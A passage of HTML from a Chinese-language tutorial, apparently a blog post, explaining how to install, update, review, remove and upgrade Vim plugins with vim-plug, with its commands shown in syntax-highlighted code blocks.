style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ curl -fLo ~/.config/nvim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75294284e866918147-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75294284e866918147-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75294284e866918147-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">curl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fLo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">config</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nvim</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">autoload</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">plug</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">vim</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">create</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dirs </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75294284e866918147-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">用法</h3>\n<h4 id=\"toc_3\">安装插件</h4>\n<p>要安装插件，你必须如下所示首先在 Vim 配置文件中声明它们。一般 Vim 的配置文件是 <code>~/.vimrc</code>，Neovim 的配置文件是 <code>~/.config/nvim/init.vim</code>。请记住，当你在配置文件中声明插件时，列表应该以 <code>call plug#begin(PLUGIN_DIRECTORY)</code> 开始，并以 <code>plug#end()</code> 结束。</p>\n<p>例如，我们安装 “lightline.vim” 插件。为此，请在 <code>~/.vimrc</code> 的顶部添加以下行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752942852619569092\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncall plug#begin('~/.vim/plugged')\r\nPlug 'itchyny/lightline.vim'\r\ncall plug#end()\r\n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752942852619569092-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752942852619569092-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a752942852619569092-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752942852619569092-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a752942852619569092-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752942852619569092-1\"><span class=\"crayon-e\">call </span><span class=\"crayon-v\">plug</span><span class=\"crayon-p\">#begin('~/.vim/plugged')</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752942852619569092-2\"><span class=\"crayon-i\">Plug</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'itchyny/lightline.vim'</span></div><div class=\"crayon-line\" id=\"crayon-5b4a752942852619569092-3\"><span class=\"crayon-e\">call </span><span class=\"crayon-v\">plug</span><span class=\"crayon-p\">#end()</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752942852619569092-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a752942852619569092-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>在 vim 配置文件中添加上面的行后，通过输入以下命令重新加载：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752942856483114335\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:source ~/.vimrc\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752942856483114335-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752942856483114335-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752942856483114335-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">vimrc</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752942856483114335-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>或者，只需重新加载 Vim 编辑器。</p>\n<p>现在，打开 vim 编辑器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75294285b355526580\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ vim\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75294285b355526580-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75294285b355526580-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75294285b355526580-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">vim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75294285b355526580-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>使用以下命令检查状态：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75294285f985000437\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:PlugStatus\r\n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75294285f985000437-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75294285f985000437-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75294285f985000437-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75294285f985000437-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">PlugStatus</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75294285f985000437-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a75294285f985000437-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>然后输入下面的命令，然后按回车键安装之前在配置文件中声明的插件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752942862228299979\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:PlugInstall\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752942862228299979-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752942862228299979-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752942862228299979-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">PlugInstall</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752942862228299979-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h4 id=\"toc_4\">更新插件</h4>\n<p>要更新插件，请运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752942865493844028\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:PlugUpdate\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752942865493844028-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752942865493844028-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752942865493844028-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">PlugUpdate</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752942865493844028-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>更新插件后，按下 <code>d</code> 查看更改。或者，你可以之后输入 <code>:PlugDiff</code>。</p>\n<h4 id=\"toc_5\">审查插件</h4>\n<p>有时，更新的插件可能有新的 bug 或无法正常工作。要解决这个问题，你可以简单地回滚有问题的插件。输入 <code>:PlugDiff</code> 命令，然后按回车键查看上次 <code>:PlugUpdate</code>的更改，并在每个段落上按 <code>X</code> 将每个插件回滚到更新前的前一个状态。</p>\n<h4 id=\"toc_6\">删除插件</h4>\n<p>删除一个插件删除或注释掉你以前在你的 vim 配置文件中添加的 <code>plug</code> 命令。然后，运行 <code>:source ~/.vimrc</code> 或重启 Vim 编辑器。最后，运行以下命令卸载插件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a752942869984507499\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:PlugClean\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a752942869984507499-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a752942869984507499-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a752942869984507499-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">PlugClean</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a752942869984507499-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>该命令将删除 vim 配置文件中所有未声明的插件。</p>\n<h4 id=\"toc_7\">升级 Vim-plug</h4>\n<p>要升级vim-plug本身，请输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75294286c511170621\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:PlugUpgrade\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75294286c511170621-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75294286c511170621-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75294286c511170621-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">PlugUpgrade</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75294286c511170621-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>如你所见，使用 Vim-plug 管理插件并不难。它简化了插件管理。现在去找出你最喜欢的插件并使用 Vim-plug 来安装它们。</p>\n<p>就是这些了。我将很快在这里发布另一个有趣的话题。在此之前，请继续关注我们。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114132\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114132votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114132\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN 